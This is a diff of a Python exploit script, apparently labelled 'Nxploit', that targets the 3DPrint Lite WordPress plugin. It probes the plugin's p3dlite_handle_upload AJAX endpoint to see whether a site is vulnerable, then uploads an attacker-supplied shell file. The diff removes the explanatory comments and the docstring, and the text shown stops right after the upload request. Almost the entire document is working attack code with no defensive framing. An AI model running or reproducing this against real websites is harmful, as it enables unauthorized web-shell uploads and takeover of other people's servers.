@@ -1,8 +1,10 @@
+#Nxploit
+
 import os
 import requests
 import sys
 
-# ANSI color codes for styling
+
 class Colors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -15,28 +17,19 @@ class Colors:
     UNDERLINE = '\033[4m'
 
 def exploit_url(target_url, file_path):
-    """
-    Exploits the vulnerability in 3DPrint Lite plugin to upload a shell file.
-
-    Args:
-        target_url (str): The target URL.
-        file_path (str): The path to the shell file to upload.
-
-    Returns:
-        str: The result of the exploitation attempt.
-    """
+    
     if not os.path.isfile(file_path):
         return f"{Colors.FAIL}Error: Invalid file! Please check the file path.{Colors.ENDC}"
 
     target_url = target_url.rstrip('/')
     upload_url = f"{target_url}/wp-admin/admin-ajax.php?action=p3dlite_handle_upload"
 
-    # Check if the target is vulnerable
+    
     response = requests.get(upload_url)
     if "filename" not in response.text:
         return f"{Colors.WARNING}Target is not vulnerable.{Colors.ENDC}"
 
-    # Attempt to upload the shell
+    
     with open(file_path, 'rb') as file:
         response = requests.post(upload_url, files={'file': file})
 
